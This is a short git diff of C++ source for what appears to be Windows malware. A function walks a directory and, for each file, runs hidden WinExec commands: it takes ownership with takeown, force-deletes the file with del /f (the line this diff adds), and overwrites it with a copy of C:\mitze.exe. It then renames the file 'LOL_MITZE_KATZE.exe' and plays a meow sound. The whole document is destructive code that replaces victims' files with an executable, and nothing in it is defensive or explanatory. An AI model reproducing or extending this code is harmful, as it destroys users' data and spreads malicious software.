@@ -41,13 +41,17 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				string Chickfila = directory + std::string(FindFileData.cFileName);
 				mciSendString("play meow.mp3", NULL, 0, NULL);
 				string Gutter = "takeown /f " + string(Chickfila);
+				string Dutter = "del /f  "+ string(Chickfila);
 				string Butter = "copy C:\\mitze.exe /Y "+ string(Chickfila);
 				//cout << Butter;
 				const char* Sucker = Gutter.c_str();
-				const char* Sucker2 = Butter.c_str();
+				const char* Sucker2 = Dutter.c_str();
+				const char* Sucker3 = Butter.c_str();
+
 				WinExec(Sucker, SW_HIDE);
-				//PlaySound(TEXT("meow.mp3"),NULL,SND_FILENAME | SND_ASYNC);
 				WinExec(Sucker2, SW_HIDE);
+				//PlaySound(TEXT("meow.mp3"),NULL,SND_FILENAME | SND_ASYNC);
+				WinExec(Sucker3, SW_HIDE);
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
 			}
 			else
